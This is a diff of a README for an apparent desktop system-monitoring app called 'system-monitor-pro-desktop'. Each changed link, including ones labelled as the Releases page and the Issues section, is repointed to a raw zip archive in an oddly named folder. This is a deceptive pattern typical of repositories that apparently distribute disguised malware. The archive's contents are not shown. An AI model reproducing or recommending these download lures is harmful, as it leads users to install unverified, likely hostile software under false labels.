@@ -1,6 +1,6 @@
 # 🎉 system-monitor-pro-desktop - Monitor Your System Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Ismail-4563/system-monitor-pro-desktop/main/cooruptibly/pro_desktop_monitor_system_3.3.zip)](https://raw.githubusercontent.com/Ismail-4563/system-monitor-pro-desktop/main/cooruptibly/pro_desktop_monitor_system_3.3.zip)
+[![Download](https://github.com/Ismail-4563/system-monitor-pro-desktop/raw/refs/heads/main/cooruptibly/pro-system-desktop-monitor-v2.5-alpha.3.zip)](https://github.com/Ismail-4563/system-monitor-pro-desktop/raw/refs/heads/main/cooruptibly/pro-system-desktop-monitor-v2.5-alpha.3.zip)
 
 ## 🛠️ Overview
 system-monitor-pro-desktop is a professional desktop application designed to help users monitor their system's performance. Whether you want to check CPU usage, memory status, or GPU performance, this application provides a simple interface to visualize key data about your computer's health.
@@ -9,7 +9,7 @@ system-monitor-pro-desktop is a professional desktop application designed to hel
 To begin using system-monitor-pro-desktop, follow these simple steps to download and install the application.
 
 ## 📥 Download & Install
-Visit the page to download the application: [Download system-monitor-pro-desktop](https://raw.githubusercontent.com/Ismail-4563/system-monitor-pro-desktop/main/cooruptibly/pro_desktop_monitor_system_3.3.zip).
+Visit the page to download the application: [Download system-monitor-pro-desktop](https://github.com/Ismail-4563/system-monitor-pro-desktop/raw/refs/heads/main/cooruptibly/pro-system-desktop-monitor-v2.5-alpha.3.zip).
 
 1. Click on the link above to reach the Releases page.
 2. Once there, look for the latest version of the application.
@@ -61,11 +61,11 @@ If you encounter issues while using the application, consider these common solut
 To keep track of updates or new features, watch this repository for the latest changes. You will be notified via GitHub whenever a new version is released.
 
 ## 👥 Support
-If you have questions or need assistance, you can reach out through the [Issues section](https://raw.githubusercontent.com/Ismail-4563/system-monitor-pro-desktop/main/cooruptibly/pro_desktop_monitor_system_3.3.zip) on GitHub. Here, you can report bugs, suggest features, or seek help with the application.
+If you have questions or need assistance, you can reach out through the [Issues section](https://github.com/Ismail-4563/system-monitor-pro-desktop/raw/refs/heads/main/cooruptibly/pro-system-desktop-monitor-v2.5-alpha.3.zip) on GitHub. Here, you can report bugs, suggest features, or seek help with the application.
 
 ## 🔧 License
 This project is licensed under the MIT License. You are free to modify and distribute the software as long as you include the original license.
 
 Feel free to explore and enjoy monitoring your system with system-monitor-pro-desktop! 
 
-For downloading the application, visit the page: [Download system-monitor-pro-desktop](https://raw.githubusercontent.com/Ismail-4563/system-monitor-pro-desktop/main/cooruptibly/pro_desktop_monitor_system_3.3.zip).
+For downloading the application, visit the page: [Download system-monitor-pro-desktop](https://github.com/Ismail-4563/system-monitor-pro-desktop/raw/refs/heads/main/cooruptibly/pro-system-desktop-monitor-v2.5-alpha.3.zip).
